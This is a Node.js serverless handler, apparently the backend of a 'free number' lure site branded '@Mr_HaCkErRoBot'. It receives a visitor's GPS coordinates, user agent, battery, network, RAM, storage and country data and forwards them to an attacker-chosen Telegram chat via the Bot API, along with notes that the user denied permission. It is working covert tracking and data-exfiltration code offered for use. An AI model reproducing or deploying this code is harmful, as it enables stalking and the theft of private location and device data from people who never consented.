const fetch = require('node-fetch');
const FormData = require('form-data');
const formidable = require('formidable');

const rateLimitMap = new Map(); 

module.exports = async (req, res) => {
  const botToken = process.env.TOKEN;
  const allowedOrigin = 'https://free-number1.vercel.app'; // ← دامنه‌ی مجاز

  // بررسی Origin
  if (req.headers.origin && req.headers.origin !== allowedOrigin) {
    return res.status(403).json({ ok: false, error: 'Invalid origin' });
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ ok: false, error: 'Method not allowed' });
  }
  
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const currentTime = Date.now();
  const windowTime = 15 * 60 * 1000; 

  if (!rateLimitMap.has(ip)) {
    rateLimitMap.set(ip, []);
  }

  const timestamps = rateLimitMap.get(ip);
  const recentRequests = timestamps.filter(ts => currentTime - ts < windowTime);
  recentRequests.push(currentTime);
  rateLimitMap.set(ip, recentRequests);

  if (recentRequests.length > 10) {
    return res.status(429).json({ ok: false, error: 'Too many requests from this IP. Please wait 15 minutes.' });
  }

  const form = new formidable.IncomingForm();

  form.parse(req, async (err, fields, files) => {
    if (err) {
      return res.status(500).json({ ok: false, error: 'Failed to parse form data.' });
    }

    const allowedFields = [
      'chat_id', 'latitude', 'longitude', 'user_agent', 'timezone',
      'battery_level', 'battery_charging', 'network_type', 'network_speed',
      'ram', 'storage', 'country_code'
    ];

    for (const field in fields) {
      if (!allowedFields.includes(field)) {
        return res.status(400).json({ ok: false, error: 'Invalid input field: ' + field });
      }
    }

    const {
      chat_id: chatId,
      latitude,
      longitude,
      user_agent: userAgent,
      timezone,
      battery_level: batteryLevel,
      battery_charging: batteryCharging,
      network_type: networkType,
      network_speed: networkSpeed,
      ram,
      storage,
      country_code: countryCode
    } = fields;

    if (!chatId || !latitude || !longitude) {
      return res.status(400).json({ ok: false, error: 'Missing required parameters.' });
    }

    try {
      const now = new Date();
      const dateTime = now.toLocaleString();

      const messageText = `*╭┈┈┈┈┈┈┈┈┈┈┈┈┈╮\n⚡Powered by :- @Mr_HaCkErRoBot\n╰┈┈┈┈┈┈┈┈┈┈┈┈┈╯*\n\n` +
        `*📌 New Data Received:*\n\n` +
        `*📍 Latitude:* ${latitude}\n` +
        `*📍 Longitude:* ${longitude}\n` +
        `*📱 User Agent:* ${userAgent || 'Unknown'}\n` +
        `*📅 Date:* ${dateTime}\n` +
        `*🌍 Timezone:* ${timezone || 'Unknown'}\n` +
        `*🔋 Battery:* ${batteryLevel || 'Unknown'}% (${batteryCharging === 'true' ? 'Charging' : 'Not Charging'})\n` +
        `*📶 Network:* ${networkType || 'Unknown'} (${networkSpeed || 'Unknown'} Mbps)\n` +
        `*📞 Selected Number:* User Denied\n` +
        `*🌐 Country Code:* ${countryCode || 'Unknown'}\n` +
        `*💾 RAM:* ${ram || 'Unknown'} GB\n` +
        `*💽 Storage:* ${storage || 'Unknown'}\n` +
        `*🔒 Permission:* Denied`;

      const locationRes = await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams({ chat_id: chatId, latitude, longitude })
      });

      const locResult = await locationRes.json();
      if (!locResult.ok) {
        return res.status(500).json({ ok: false, error: locResult.description });
      }

      const messageRes = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams({ chat_id: chatId, text: messageText, parse_mode: 'Markdown' })
      });

      const msgResult = await messageRes.json();
      if (!msgResult.ok) {
        return res.status(500).json({ ok: false, error: msgResult.description });
      }

      return res.status(200).json({ ok: true });
    } catch (error) {
      return res.status(500).json({ ok: false, error: 'Failed to send data: ' + error.message });
    }
  });
};
